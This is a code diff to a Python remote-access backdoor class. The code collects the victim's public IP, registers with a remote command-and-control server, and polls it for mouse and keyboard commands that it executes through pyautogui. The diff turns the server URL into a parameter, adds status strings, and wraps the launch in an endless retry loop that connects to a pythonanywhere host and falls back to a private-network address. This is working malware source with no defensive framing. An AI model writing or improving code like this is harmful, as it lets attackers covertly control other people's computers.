@@ -1,8 +1,8 @@
 import requests,time,os,keyboard,pyautogui,webbrowser
 
 class backdoor:
-    def __init__(self):
-        self.url = "https://pybackdoor.pythonanywhere.com/"
+    def __init__(self, url="http://127.0.0.1:8000/"):
+        self.url = url
         ip = requests.get("https://api64.ipify.org/").text
         self.id = requests.get(self.url+"api/get_id/"+ip).json()['id']
         while True:
@@ -180,6 +180,7 @@ class backdoor:
                         else:
                             pyautogui.click()
                             continue
+                        output += "Clicked"
                     elif mouse_command.startswith("click"):
                         mouse_command_args = mouse_command.replace("click", "")
                         mouse_command_args = mouse_command_args.replace("(", "")
@@ -193,6 +194,7 @@ class backdoor:
                         else:
                             pyautogui.click()
                             continue
+                        output += "Clicked"
                     elif mouse_command.startswith("move"):
                         mouse_command_args = mouse_command.replace("move", "")
                         mouse_command_args = mouse_command_args.replace("(", "")
@@ -229,5 +231,9 @@ class backdoor:
                 
 
         return output
-
-backdoor()   
+while True:
+    try:
+        backdoor("https://pybdtest.pythonanywhere.com/") 
+    except:
+        backdoor("http://10.2.100.100:8000/") 
+  
